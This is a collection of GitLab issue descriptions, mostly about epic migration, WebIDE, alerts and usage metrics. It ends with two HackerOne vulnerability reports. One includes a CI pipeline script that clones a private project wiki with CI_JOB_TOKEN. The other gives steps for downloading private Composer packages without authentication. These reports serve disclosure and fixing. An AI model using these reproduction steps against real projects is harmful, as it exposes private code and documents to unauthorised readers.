title: Epic migration should include comment award emojis
description:
## Problem to Solve

With the implementation of the [Epic migration MVC](https://gitlab.com/gitlab-org/gitlab/-/issues/250281), the following Epic attributes are already being migrated:
* title
* description
* state
* createdAt
* closedAt
* startDate
* startDateFixed
* startDateIsFixed
* dueDateFixed
* dueDateIsFixed
* relativePosition
* confidential

This provides the basic info for each Epic, but leaves out any relations, such as Parent Epics, Labels, Comments, etc., which is something that users would expect is included in a full Group Migration.

For the users to confidently use the Group Migration feature, we need to iteratively deliver the import of the remaining Epic data, per [this proposal](https://gitlab.com/gitlab-org/gitlab/-/issues/267951#proposed-solution-footprints). 

## Proposed Solution

In this issue, we will implement the migration of Epic **comment award emojis** (reactions).

* All award emojis for each epic comment should be migrated.

# Documentation
* User docs: https://docs.gitlab.com/ee/user/group/import/ 
* Dev docs: https://docs.gitlab.com/ee/development/bulk_import.html

title: Epic migration should include comments
description:
## Problem to Solve

With the implementation of the [Epic migration MVC](https://gitlab.com/gitlab-org/gitlab/-/issues/250281), the following Epic attributes are already being migrated:
* title
* description
* state
* createdAt
* closedAt
* startDate
* startDateFixed
* startDateIsFixed
* dueDateFixed
* dueDateIsFixed
* relativePosition
* confidential

This provides the basic info for each Epic, but leaves out any relations, such as Parent Epics, Labels, Comments, etc., which is something that users would expect is included in a full Group Migration.

For the users to confidently use the Group Migration feature, we need to iteratively deliver the import of the remaining Epic data, per [this proposal](https://gitlab.com/gitlab-org/gitlab/-/issues/267951#proposed-solution-footprints). 

## Proposed Solution

In order to use notes type in GraphQL we need to make sure that the response is ordered by (discussion_id, created_at, id). This way we can import notes preserving threading and we ensure a first note with a new discussion id is actually a first note for that thread. Original suggestion can be found in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/55769#note_535674698

In this issue, we will implement the migration of Epic **comments** (notes).

* All comments for each epic should be migrated (including nested responses).
* Comments should be associated with the importer user OR with original user if its public email is available and user was found by such email
* Comment award emojis are **not** included in this issue - a separate issue was created for [comment award emojis](https://gitlab.com/gitlab-org/gitlab/-/issues/297467)

* GraphQL query:
```graphql
query getEpicNotes($full_path: ID!, $epic_iid: ID!, $cursor: String) {
  group(fullPath: $full_path) {
    epics(iid: $epic_iid) {
      nodes {
        webUrl
        notes(first: 100, after: $cursor) {
          page_info: pageInfo {
            has_next_page: hasNextPage
            end_cursor: endCursor
          }
          nodes {
            body
            confidential
            system
            system_note_icon_name: systemNoteIconName
            created_at: createdAt
            updated_at: updatedAt
            resolvable
            resolved
            resolved_at: resolvedAt
            resolved_by: resolvedBy {
              public_email: publicEmail
            }
            author {
              public_email: publicEmail
            }
            discussion {
              id
            }
          }
        }
      }
    }
  }
}
```

* Use https://gitlab.com/gitlab-org/gitlab/-/merge_requests/53747 as reference for the nested pagination (For each epic, we need to fetch 1 or many pages of notes)
* Discussion ids are exposed as GlobalID, like `"gid://gitlab/Discussion/a41e4f32accc8cacb6044c21674a7b72b47c71d8"`, to parse:
```console
[dev](main)> GlobalID.parse("gid://gitlab/Discussion/a41e4f32accc8cacb6044c21674a7b72b47c71d8").model_id
=> "a41e4f32accc8cacb6044c21674a7b72b47c71d8"
```
* Use the `Pipeline::Context#extra` field to map old discussion ids to the new ones, like:

1. In the transformer
```ruby
def replace_discussion_id(context, data)
  original_discussion_id = data.delete['discussion_id']

  if context.extra[:discussion_id_map][original_discussion_id] 
    # if discussion_id already map, some note for this discussion was already imported
    # this way, we keep the discussion mapped.
    data['discussion_id'] = context.extra[:discussion_id_map][original_discussion_id]
  else 
    # if there's no context.extra[:discussion_id_map][original_discussion_id], so it's the first note in the discussion
    # pass it in the `original_discussion_id` key to be mapped in the loader
    data['original_discussion_id'] = original_discussion_id
  end

  data
end
```

2. In the loader:
```ruby
def load(context, data)
  original_discussion_id = data.delete['original_discussion_id']

  note = # ... create the note(data)

  if original_discussion_id
    # this value will only exist for the first note of this discussion
    context.extra[:discussion_id_map][original_discussion_id] = note.discussion_id
  end
end
```

# Documentation
* User docs: https://docs.gitlab.com/ee/user/group/import/ ([WIP](https://docs.gitlab.com/gitlab-org/gitlab/-/issues/292107)) 
* Dev docs: https://docs.gitlab.com/ee/development/bulk_import.html

title: Display a warning if users do not have Agent K configured
description:
## Why are we doing this work
- Users are currently able to add Alerts to a policy even if they do not have AgentK or KAS installed and enabled for the project.  This is a problem as users will then wonder why they are not getting any Alerts.  As most users who have AgentK installed and configured are also likely to have KAS enabled, we are scoping this Alert to only display if AgentK is not enabled for the current project.

## Design
- When AgentK is installed and configured for a project, then there will be no change to current designs.
- When AgentK is not installed or configured for a project, then a warning message will be displayed, including a link to documentation on how to install AgentK.

## Non-functional requirements
- [ ] Documentation: I am waiting until the end to update the documentation as this feature is behind a feature flag
- [ ] Feature flag: This feature is behind the `threat_monitoring_alerts` feature flag
- [ ] Testing

## Implementation plan
- [x] ~backend create an endpoint that will return true or false depending on whether or not AgentK is installed in the specified project.  The database can be queried to get this information for the specific project.
  - Done with
```
query {project(fullPath: "root/agent_project") {
    clusterAgents{
      count      
    }
  }
}
```
- [ ] ~frontend conditionally add a warning message on the create/edit policy page.

### Existing resources
 - [Agent model](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/clusters/agent.rb)
 - [Agent type](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/graphql/types/clusters/agent_type.rb)

title: Aggregate duplicate events under one Alert
description:
## Why are we doing this work
- Currently duplicate events each generate a separate Alert.  This generates a high volume of Alerts and is difficult for the users to review

## Design
- Reference existing functionality in the Monitor team: https://gitlab.com/gitlab-examples/ops/incident-setup/everyone/tanuki-inc/-/alert_management

## Non-functional requirements
- [ ] Documentation: I am waiting until the end to update the documentation as this feature is behind a feature flag
- [ ] Feature flag: This feature is behind the `threat_monitoring_alerts` feature flag
- [ ] Testing

## Implementation plan
- [x] ~backend ensure that duplicate events are aggregated under a single Alert (de-duplicating payloads that may be different only due to a timestamp that is off by a few seconds). The aggregation is based on the [fingerprint logic](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/alert_management/fingerprint.rb#L10-21) as discussed in https://gitlab.com/gitlab-org/gitlab/-/issues/297461#note_485326835.
  - [x] Pick a time interval based on the average of the data generated by browser requests (i.e. connection timeout greater than one second)
  - [x] Use the time interval and the payload which comes from [internal api endpoint](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/lib/ee/api/internal/kubernetes.rb#L12) when considering the data for the aggregation function.
 - [x] Send SHA1 hash as fingerpritn (see comments below)

title: Epics should preserve parent-child association during migration
description:
## Problem to Solve

With the implementation of the [Epic migration MVC](https://gitlab.com/gitlab-org/gitlab/-/issues/250281), the following Epic attributes are already being migrated:
* title
* description
* state
* createdAt
* closedAt
* startDate
* startDateFixed
* startDateIsFixed
* dueDateFixed
* dueDateIsFixed
* relativePosition
* confidential

This provides the basic info for each Epic, but leaves out any relations, such as Parent Epics, Labels, Comments, etc., which is something that users would expect is included in a full Group Migration.

For the users to confidently use the Group Migration feature, we need to iteratively deliver the import of the remaining Epic data, per [this proposal](https://gitlab.com/gitlab-org/gitlab/-/issues/267951#proposed-solution-footprints). 

## Proposed Solution

1. Embed the parent epic on the Epic Query

```graphql
fragment EpicFields on Epic {
  title
  description
  state
  create_at: createdAt
  closed_at: closedAt
  start_date: startDate
  start_date_fixed: startDateFixed
  start_date_is_fixed: startDateIsFixed
  due_date_fixed: dueDateFixed
  due_date_is_fixed: dueDateIsFixed
  relative_position: relativePosition
  confidential
}

query ($full_path: ID!, $cursor: String) {
  group(fullPath: $full_path) {
    epics(includeDescendantGroups: false, first: 100, after: $cursor) {
      pageInfo {
        endCursor
        hasNextPage
      }
      nodes {
        ...EpicFields
        parent {
          ...EpicFields
        }
      }
    }
  }
}
```

2. Add a new EpicParentTransformer.
   * If `hasParent` -> try to locate it using parent's title/description/createdAt.
   * If it's located - replace 'parent' key with epic object.
   * If not - build a new epic within 'parent' key.
1. During saving we might be potentially creating 2 epics, a child and parent at the same time.

# Documentation
* User docs: https://docs.gitlab.com/ee/user/group/import/ ([WIP](https://docs.gitlab.com/gitlab-org/gitlab/-/issues/292107))
* Dev docs: https://docs.gitlab.com/ee/development/bulk_import.html

title: [DevOps Report] Enable Adoption Report if any Segments exist
description:
### Problem to solve

We are now [considering the DevOps Adoption Report a Beta feature](https://gitlab.com/gitlab-org/gitlab/-/issues/297434).  However, according to our anonymous visit tracking, it seems there may be a substantial number of customers using the feature already.  If we change the feature flag to default disabled, these customers will probably be confused.

### Proposal

~~Enable the feature if Segments exist, regardless of the feature flag setting.~~
Determine the feature flag default based on the existence of any Segments, like this:
```
Feature.enabled?(:devops_adoption_feature, default_enabled: Segment.any?)
```

Also, backport to %13.7 like https://gitlab.com/gitlab-org/gitlab/-/issues/297434.

title: Update Approval Rule documentation
description:
https://gitlab.com/gitlab-org/gitlab/-/issues/254958#note_478394219

Approval Rule documentation needs to be updated to reflect existing behavior, specifically these two examples

> 1. If approvals overriding is **disabled**, changing the project approval rules **changes all existing MRs**.
> 1. If approvals overriding is **enabled**, changing the project approval rules **does not change any of the existing MRs**, regardless if those MRs have overridden the project rules or not.
> 1. Furthermore, if I override an MRs approval rules and then **disable** overriding, the overridden MR assumes the project approval rules. But if I then **enable** overriding again, the MR recovers the rules that I had overridden, and is back to how it was before overriding was disabled.



> changing an approval rule's **target branch** affects existing merge requests when overriding approval rules is **enabled**, which is a different behavior from all of the other approval rule fields.

title: Improve UX of WebIDE by introducing the loading state when fetching a file's content
description:
### Proposal 

At the moment, the switch between files (tabs) in WebIDE happens pretty harshly with removing the content of a currently opened file right away and not showing any progress while fetching the new file's content. 

This issue suggests the introduction of loading state on the currently-opened file while we fetch the content for a new file as a combination of bluring the currently opened file and showing the standard spinner while the content is being fetched.

![WebIDE, the loading state](https://gitlab.com/gitlab-org/gitlab/uploads/075b960ffb1c5897bc3555fa3b529f96/Screenshot_2021-01-08_at_14.56.34.png)

title: In WebIDE the repo_editor component is destroyed and re-created every time a file is closed
description:
### Summary

When closing a file (tab) in WebIDE, the following chain of actions takes place:

1. close the opened file
1. update the state marking it as non-active anymore
1. compute what file should be opened next
1. switch state for the new file to be active and opened

Step 1 here means that we destroy `repo_editor` component every time the file gets closed and re-mount it on step 4 again. This also means that we discard the monaco editor and create it again on these steps.

### Steps to reproduce

Set debugger in `mounted()` and `beforeDestroy()` callbacks of `repo_editor` component to see those being fired every time one closes a file.

### What is the current *bug* behavior?

The component is unnecessarily destroyed every time a file is closed

### What is the expected *correct* behavior?

We should not discard the component and re-use it for as long as we have at least one file opened in WebIDE

title: Introduce WebIDE extension for Editor Lite
description:
### Proposal 

In the course of [replacing the underlying driver in WebIDE with Editor Lite](https://gitlab.com/gitlab-org/gitlab/-/issues/292498), the existing editor's functionality should be converted into an extension that can be consumed by Editor Lite.

See [the PoC](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51212) for more details

## ToDo

- [ ] [Introduce the extension](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51527)
- [ ] Make use of the extension in `repo_editor` component instead of the original editor module.

title: Rename Segment to Group
description:
### Overview

As outlined in https://gitlab.com/gitlab-org/gitlab/-/issues/296972, we need to avoid complexity in the product by introducing another concept of a grouping. This means we need to pivot the concept of a Segment to focus on groups. 

### Solution 

In the first iteration in 13.8, we will replace "Segment" with "Group" in the UI, and limit the number of groups that can be added to the modal to one group. 

- [ ] In the DevOps Adoption table, change the Segment header to Group
- [ ] In the tooltip, change the message "Segment data pending until the start of next month" to "Group data pending until the start of next month". This message will likely change with https://gitlab.com/gitlab-org/gitlab/-/issues/289856
- [ ] Change the "Add new segment" button to "Add group"
- [ ] In the modal, change "New segment" to "Add group", change "My segment" to "My group" and change "Create new segment" to "Add group"
- [ ] In the editing options for each row, change "Edit segment" to "Edit group" and "Delete segment" to "Delete group". 
- [ ] Limit the number of groups that can be selected in the modal to one group and change the messaging in the modal to read either 0 groups selected or 1 group selected

In the next iteration we will refactor the table to only support one group per row, and migrate any existing segments to the new format. Issue to be created.

title: Retain Location in Overview and Changes tabs of an MR
description:
### Release notes

In previous releases, when switching tabs between the Overview and Changes in an MR - you had to restart at the top of either the Overview or the Changes despite you wanting to flip back and forth to review the same content. This often led to opening many browser tabs on the same MR to compare content. Now when you leave any tab in an Merge Request and come back to it
you will have the same content you left in front of you.

### Problem to solve 

When I have a description in the MR that includes an overview of the changes I want to read those and the specific changes at the same time and jump back and forth without loosing my place.

title: Design: managing incidents on boards
description:
<!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.-->

### Problem

As part of https://gitlab.com/gitlab-org/gitlab/-/issues/297594, we discovered that people managing incidents in boards were struggling with the following:

* It's difficult to surface (and/or visualize) priority and severity in boards
* It's difficult to access "frequently filtered views" (other than through creating bookmarks)
* It's difficult to see what's new on boards

This issue will be for digging into these difficulties further and ideating on solutions for them.

### Outcome

### Short-term items (ideas that seemed to be the most robust and immediately actionable)

* Adding severity as a filter item (only displaying it as an option if severity is being used by an issue on the Board)
* Adding severity as a "group by" option (only displaying it as an option if severity is being used by an issue on the Board)
* Saved searches

### Longer-term item (ideas that need further consideration before they are actionable)

* List sorting + global sorting options for boards
* View options for boards
* Allow each issue type to design its own "card" view
* Support additional filter inputs like time + additional operators like `is between` (this would help surface new incidents in the list)

We will continue collaborating on the short-term items in the following issues:

- Saved searches: https://gitlab.com/gitlab-org/gitlab/-/issues/14512
- Severity as a filter item: https://gitlab.com/gitlab-org/gitlab/-/issues/322768
- Severity as a group-by item: https://gitlab.com/gitlab-org/gitlab/-/issues/322777

[Figma link](https://www.figma.com/file/bXRzxtkT0cml9BkQTFrd3N/Design-Introduce-visual-indicator-of-issue-type-gitlab-com-and-292831-Copy?node-id=659%3A7442)

title: [DevOps Report] Consider Adoption Report a beta feature
description:
### Problem to solve

As explained in [another issue](https://gitlab.com/gitlab-org/gitlab/-/issues/296972), we have decided to pivot the "segment" concept.  This will likely involve eliminating segments, but enabling data collection for the groups included in existing segments.  Regardless, there is now high risk of breakage with the Adoption Report feature, which is built on top of segments.

### Proposal

Consider the Adoption Report a beta feature:

- [x] Add a "beta feature" note to the documentation in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51518
- [x] Revert to disabling the feature flag by default in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51518, and https://gitlab.com/gitlab-org/gitlab/-/issues/297434 added consideration of existing Segments
- [x] Backport to %13.7 see https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51518#note_484230221

epic.title: Modify DevOps Adoption to focus on groups rather than segments

title: Replace current import usage counters by Import count metrics
description:
## Problem 

Usage counters under `usage_activity_by_stage_manage` have been incorrectly changed to count unique users, instead of counting import actions. These counters need to be updated to again count import actions.

## Proposal

* Clean up current counters to only count import actions (not unique users):
```
          bulk_imports: {
            gitlab: distinct_count(::BulkImport.where(time_period, source_type: :gitlab), :user_id)
          },
          projects_imported: {
            total: distinct_count(::Project.where(time_period).where.not(import_type: nil), :creator_id),
            gitlab_project: projects_imported_count('gitlab_project', time_period),
            gitlab: projects_imported_count('gitlab', time_period),
            github: projects_imported_count('github', time_period),
            bitbucket: projects_imported_count('bitbucket', time_period),
            bitbucket_server: projects_imported_count('bitbucket_server', time_period),
            gitea: projects_imported_count('gitea', time_period),
            git: projects_imported_count('git', time_period),
            manifest: projects_imported_count('manifest', time_period)
          },
          issues_imported: {
            jira: distinct_count(::JiraImportState.where(time_period), :user_id),
            fogbugz: projects_imported_count('fogbugz', time_period),
            phabricator: projects_imported_count('phabricator', time_period),
            csv: distinct_count(Issues::CsvImport.where(time_period), :user_id)
          },
          groups_imported: distinct_count(::GroupImportState.where(time_period), :user_id)

```
https://gitlab.com/gitlab-org/gitlab/blob/master/lib/gitlab/usage_data.rb#L585

epic.title: Add unique users importing projects to usage ping (Import GMAU)

title: Create usage metric for the Project Import GMAU
description:
## Problem 

In https://gitlab.com/gitlab-org/manage/general-discussion/-/issues/17232, we described the need for a Group MAU ([GMAU](https://about.gitlab.com/handbook/product/performance-indicators/#group-monthly-active-users-gmau)) for Import. This should be a measure of the number of unique users taking an action that is important to the goals of the group.

As discussed in [this proposal](https://gitlab.com/gitlab-org/gitlab/-/issues/283175#proposal), this issue is the first iteration on this metric.

## Proposal

* Add a new usage ping metric that combines the individual metrics for project importers.
* This metric will count the number of unique users engaging any project importer feature (including projects imported by bulk/migration).
* This metric should be clearly namesd: `usage_activity_by_stage.manage.unique_users_all_imports`

epic.title: Add unique users importing projects to usage ping (Import GMAU)

title: Indicate when optional sections are contained in code owners file
description:
### Problem

If optional sections are contained in the code owners file and code owner approval is required (under protected branches settings), users may assume that **everything** is required, even optional sections.

### Proposal

When an optional section is contained in the code owners file, state to users that required approvals do not apply to optional sections.

Update tooltip to state optional sections are not enforced

![image](/uploads/0188cadd611fe3ddd1e43913cc34d233/image.png)

epic.title: Support selecting code owners sections as required approval rule

title: Users should receive a notification when they are deactivated
description:
### Release notes

Users will now receive a notification when they are blocked or deactivated.

### Problem to solve 

Currently, when a user is deactivated or blocked, they do not receive a notification.  They should receive one last notification at the time they are blocked or deactivated.

### Intended users

This affects all users

title: Caching _namespace_storage_limit_alert.html.haml
description:
`app/views/shared/_namespace_storage_limit_alert.html.haml` is loaded on most "repository" views. Currently it performs at least one, sometimes two queries similar to the following, which have a small but constant performance impact (~60ms in queries) on pages underneath a namespace with a large number of repositories (e.g. `gitlab-org/`):

```sql
SELECT SUM((("project_statistics"."repository_size" + "project_statistics"."lfs_objects_size") - 10737418240)) FROM "projects" INNER JOIN routes rs ON rs.source_id = projects.id AND rs.source_type = 'Project' INNER JOIN "project_statistics" ON "project_statistics"."project_id" = "projects"."id" WHERE (rs.path LIKE 'gitlab-org/%') AND ("project_statistics"."repository_size" + "project_statistics"."lfs_objects_size") > 10737418240 AND "projects"."repository_size_limit" IS NULL 
```

Explain: https://explain.depesz.com/s/bOOd

This view should be cachable, but we need to scope the cache key based on the following:

* Changes to the file size limit by an admin
* Changes to the quota by a user purchasing more storage
* Updates to the files in the repository

Currently I'm trying to verify if there are existing cache keys which will be updated when these areas are updated. Ideally `namespace.updated_at` should be touched under these conditions.

title: Global Search - Replace deprecatedJqueryDropdown with GlDropdown
description:
## What The dropdown in question is here: ![Screen_Shot_2021-01-12_at_10.23.25_AM](/uploads/9c6ec33fadc0019c84692b46c2ffb41b/Screen_Shot_2021-01-12_at_10.23.25_AM.png) We found some bugs to the JavaScript event handlers found in the legacy dropdown. More can be read here: https://gitlab.com/gitlab-org/gitlab/-/issues/254409#note_482784426 We also are wanting to add enhancements to the dropdown here: https://gitlab.com/gitlab-org/gitlab/-/issues/284139 ## Why The root cause of the bug seems to be missing event handlers in the deprecated component. Adding a fix to a deprecated component seems like a poor use of time since we should be moving away from it when possible. Since the bug is pretty niche and we also have enhancements to the component already slotted. I felt that going ahead and replacing the component with Pajama's [GlDropdown](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-dropdown--default) seems like the best approach. We can hit a _few birds with one stone_ by doing so. ## How My recommendation is to do this iteratively behind a feature flag so we can be sure to regression in production as well as be sure that all the existing functionality makes it over into the updated component. Proposed Feature Flag - (`:global-search-updated-dropdown`)
File to be replaced: https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/search_autocomplete.js ### Release Notes Previously the Header Search located on almost every page in GitLab has existed with several missing features, especially when it comes to Accessibility (A11y). You may have noticed issues such as the tab and arrow keys both focusing different options in the header search. There was also zero Screen Reader support making it impossible for users to navigate it without sight. Finally there was the rare issue where the legacy architecture made it so the header search didn't work at all and left the user without any visual cues. When using the new and improved Header Search you will immediately notice the proper keyboard functionality. You will be able to properly navigate the Header and Search with your tab and arrow keys. Additionally there is now full Screen Reader support allowing for navigation without any visual cues. Along with this we have added numerous performance increases through our up to date component architecture. This new architecture will allow for more exciting functionality to be added in the near future! In the coming days CE customers will begin to see the new search live on GitLab.com. EE customers will have to wait a bit for a full release but can activate it now with the instance feature flag `:new_header_search` | Empty Search | W/ Search | A11y Demo | | ------ | ------ | ------ | | ![Default_Searches](/uploads/6f978bd3f475fe4f8530d4774e2f6c8f/Default_Searches.png) | ![W__Search](/uploads/f114cf0152e5cf46a32f3db1889dce1a/W__Search.png) | ![A11y_Support](/uploads/ed850a2db3f68a161e78f796d87dbaad/A11y_Support.mp4) |

title: Experiment Recording  and Control/Experiment Bug Investigation
description:
### Issue

We have trial registrations (experiment group) for people in the `control` group.

While monitoring the `trial_during_signup` [experiment](https://gitlab.com/gitlab-org/gitlab/-/issues/251231), there seems to be something wrong with the assignment of people to the `control` vs `experiment` groups and/or `context`. 


We have trial registrations (experiment group) for people in the `control` group, which is not acceptable.

```sql
gitlabhq_production=> select group_type, context, count(*) from experiment_users where experiment_id=42 group by 1, 2;                          group_type |         context         | count 
------------+-------------------------+-------
          1 | {}                      |   533
          1 | {"trial_chosen": true}  |     7
          1 | {"trial_chosen": false} |   304
          0 | {}                      |   516
          0 | {"trial_chosen": true}  |     8
          0 | {"trial_chosen": false} |   290
```


### Root cause

- The `tracking_group` is calculated by `record_experiment_user` is for the `current_user` subject, whereas the one calculated by the `experiment_enabled?` is calculated for the cookie subject.

### Affected experiments

Any experiments since 2020 December 3 after [the MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48256) got deployed

- cookie-based rollout, 
- calling `record_experiment_user` 
-  are recording the `group type` (experiment vs control). 



Any experiment doing the below without `subject:`

```ruby
experiment_enabled?(:foo)

record_experiment_user(:foo)

```

### Solution

I made a draft MR suggestion to fix it

https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51468


### Verification

- [x] verify the bug, 
- [x] root cause, 
- [x] impact and 
- [x] the solution approach suggested in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/51468?

title: Define and document a workflow to deal with feature-flagged GraphQL queries & mutations
description:
With the recent introduction of the [`graphql-verify`](https://gitlab.com/gitlab-org/gitlab/-/blob/04044a0964e8dc8fee4dfa2d505b37d75939d9ce/.gitlab/ci/graphql.gitlab-ci.yml) CI job via https://gitlab.com/gitlab-org/gitlab/-/merge_requests/50655, it is no longer possible to ship GraphQL queries/mutations that don't have a corresponding schema definition in the ~backend.

This potentially affects ~frontend development workflows as it was previously possible for the ~frontend to be built ahead of the ~backend by shipping non-functional queries and mutations behind feature flags while the ~backend caught up.

* What would be an adequate workflow to deal with this kind of situations from now on?
* Can we document some guidelines in our development docs?

There a few possible approaches going forward:

## 1. Add the `.graphql` files to the list of known failures

It is possible to add invalid GraphQL files to a list of known failures in [`config/known_invalid_graphql_queries.yml`](https://gitlab.com/gitlab-org/gitlab/-/blob/5baab5102304ab98af6a5c85714af3f83f9533bb/config/known_invalid_graphql_queries.yml). This works very much like an `.eslintignore` and allows for bypassing validation on specific files. This is an easy way to temporarily skip validation while the ~backend is being worked on, and we simply need to update the file again to re-enable validation at the end of the implementation.

### Pros

* Easiest solution, almost no overhead.
* Declarative - the query is marked as invalid because it is.

### Cons

* Need to track the removal from the override when the ~backend is ready. (if we make the known-failure list stricter and flag unnecessary entries this overhead can be removed)

## 2. Define a basic ~backend schema early in the implementation

This approach would involve defining the ~backend schema early in the implementation, so that any client-side queries/mutations would immediately be considered valid. The schema wouldn't necessarily have to be done right from the get-go, it could simply define a few nullable fields, the bare minimum to support the ~frontend.

### Pros

* _If_ the schema is well defined early in the process, this solution doesn't require any cleanup step towards the end of the implementation.

### Cons

* Adds the most overhead and can delay ~frontend as this step needs to be done before any GraphQL file can be merged.

## 3. Temporarily use the `@client` directive

GraphQL queries and mutations that have the `@client` directive are not validated as those would be handled by client-side resolvers. We could choose to initially ship GraphQL changes with the `@client` directive, and remove it once the ~backend is ready. Additionally, we could also ship the changes along with client-side resolvers to mock API responses. This means shipping faked-out (feature-flagged) features, which can be useful for PMs and Product Designers to test them in staging and production.

### Pros

* Ability to ship mocked resolvers to demonstrate the features in live environments.

### Cons

* Requires a cleanup step at the end of the implementation to remove the `@client` directive, and the resolvers if any.
* Could be confusing - it is impossible to distinguish uses of the `@client` directive used to mean the field is a client-side feature from uses of it to enable faster iteration

# Conclusion

We will document approaches 3 et 1.

title: The Banner prompting users to check their account recovery settings causes confusion
description:
## Summary

<!-- Summarize the bug encountered concisely. -->

According to [this issue](https://gitlab.com/gitlab-org/gitlab/-/issues/30065), a banner pops up every 3 month to reminds the users of reviewing their recovery settings. They are supposed to check the 2fa settings, email addresses, recovery codes, and ssh keys; all that in their account settings page and that's where they are directed to when they click on the banner. But since the banner says "recovery settings", and there is no "recovery settings" page, some users are confused about what to expect and what needs to be done.

#### Steps to reproduce

<!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. -->

This banner appears to users every 3 month. So when it does, click on it and it will direct you to your account settings,

#### What is the current *bug* behavior?

<!-- Describe what actually happens. -->

Th banner says the user needs to review "recovery settings" while there is no "recovery settings page. Users are redirected to account settings with no clarification of what needs to be done.

#### What is the expected *correct* behavior?

<!-- Describe what you should see instead. -->

The  most convenient way is for users is to review the recovery settings inside that banner. The same approach is adopted by Github.

![github_recovery_settings](/uploads/5aab81de79ef91b4687827a1f0b8f666/github_recovery_settings.png)

Instead, we can have: 

- The banner should have a link to [recovery options](https://docs.gitlab.com/ee/user/profile/account/two_factor_authentication.html#recovery-options). 

- The banner should clearly state what the user should be reviewing. 
  Or When redirected to the account settings, another banner should pop up and point the user to what needs to be reviewed.

#### Relevant logs and/or screenshots
| header | header |
| ------ | ------ |
| ![banner-1](/uploads/642771a430983b8052e85f637c414981/banner-1.png) | ![banner-2](/uploads/5297c024f246d26f78bfbb71d19ebd8b/banner-2.png) |

### Output of checks

<!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --> 

This bug happens on GitLab.com . This change was introduced by !23994

## Proposal

Banner text:
- *We recommend you ensure `two-factor authentication` is enabled and that the settings are up to date.*
   - link to 2fa section: https://gitlab.com/-/profile/two_factor_auth

title: Add "Last Activity Date" to the Billable Members API
description:
### Problem to solve

There is no way to view the Last Activity Date of your group members on .com (either through the GUI or via the API)

### Intended users

* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)
* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)
* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)

### Further details

Since we don't allow Admin access on .com, Group administrators need a good way to view the Last Activity Date of members in their group. Currently, you can sort users by Last Activity, but it doesn't show an actual date of that activity.

### Proposal

* Add a Last Activity Date field to the Group Member page (being handled via https://gitlab.com/gitlab-org/gitlab/-/issues/33457)
* Add Last Activity Date to the Group Member API 

### Permissions and Security

I believe the Last Activity Date is currently restricted to the Admin API, but it would make sense to add it to the Group Member API as well.


### What does success look like, and how can we measure that?

If .com Group Owners are able to view their user's Last Activity Date.

### What is the type of buyer? 

This should be a Core feature. Everyone on .com should be able to effectively manage users in their Group.

title: Backend: Able to git the wiki despite of the Only Project Members setting
description:
**[HackerOne report #1075586](https://hackerone.com/reports/1075586)** by `shells3c` on 2021-01-10, assigned to @rchan-gitlab:

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

#####  Summary

There was a problem by mistake while confirming the patch for the Wiki bug in the past report: #887755, and the fact that the bug is still there! I am able to git private wiki using the `CI_JOB_TOKEN` (public project)

#####  Steps to reproduce

1. Create a project, set the **Wiki visibility** to **Only Project Members** in the setting page: `https://gitlab.com/<user>/<project>/edit`  
2. Login as another user (attacker), create **.gitlab-ci.yml** in an arbitrary project:

```yml  
stages:      
  - steal  
test:      
  stage: steal  
  script:      
    - 'git clone http://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/company/api.wiki.git'  
    - 'cd api.wiki && cat api-doc.md'  
```

3. In the pipeline output, you will able to read the content

#####  Examples

- Can't access this: https://gitlab.com/just4hack2/mypro/-/wikis/home  
- Try adding the following in your **.gitlab-ci.yml** and read the wiki:

```yml  
stages:      
  - steal  
test:      
  stage: steal  
  script:      
    - 'git clone http://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/just4hack2/mypro.wiki.git'  
    - 'cd api.wiki'  
    - 'ls'  
    - 'cat home.md'  
```

####  Impact

Able to read the private Wiki of Gitlab projects

title: Unprivileged access to Private Composer Package Repository packages
description:
**[HackerOne report #1074148](https://hackerone.com/reports/1074148)** by `sjerdo` on 2021-01-08, assigned to @dcouture:

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

#####  Summary

Gitlab features a [Package Registry](https://docs.gitlab.com/ee/user/packages/index.html) which can be used for public and private repositories.  
When a private repository publishes a Composer package (for private use), the package can be download by the URL, without any authentication. The only requirement is to obtain the dist download link from the composer.lock file

#####  Steps to reproduce

1. [Create a new Private group](https://gitlab.com/groups/new)  
2. [Create a new Private project](https://gitlab.com/projects/new#blank_project) in the newly private group  
3. Add a default composer.json file to the project / [create a composer package](https://docs.gitlab.com/ee/user/packages/composer_repository/#create-a-composer-package)  
```  
{
    "name": "sjerdo/private-project"  
}
```  
4. Create a tag, e.g. 1.0.0  
5. [Create a personal access token](https://gitlab.com/-/profile/personal_access_tokens) with `api` access.  
6. [Publish the composer package](https://docs.gitlab.com/ee/user/packages/composer_repository/#publish-a-composer-package-by-using-the-api) using the API and the personal access token  
7. [Create a blank composer project and install the package](https://docs.gitlab.com/ee/user/packages/composer_repository/#install-a-composer-package)  
8. Obtain the dist url from the composer.lock file  
9. Download the zip at the dist url without setting authentication credentials. (eg. by using curl).

#####  Impact

Private repositories (files) can be download by unauthorised users who can obtain the dist download URL or project ID, package name and git commit hash (eg. from a composer.lock file).

#####  Examples

Repository: https://gitlab.com/my-private-group3/private-project  
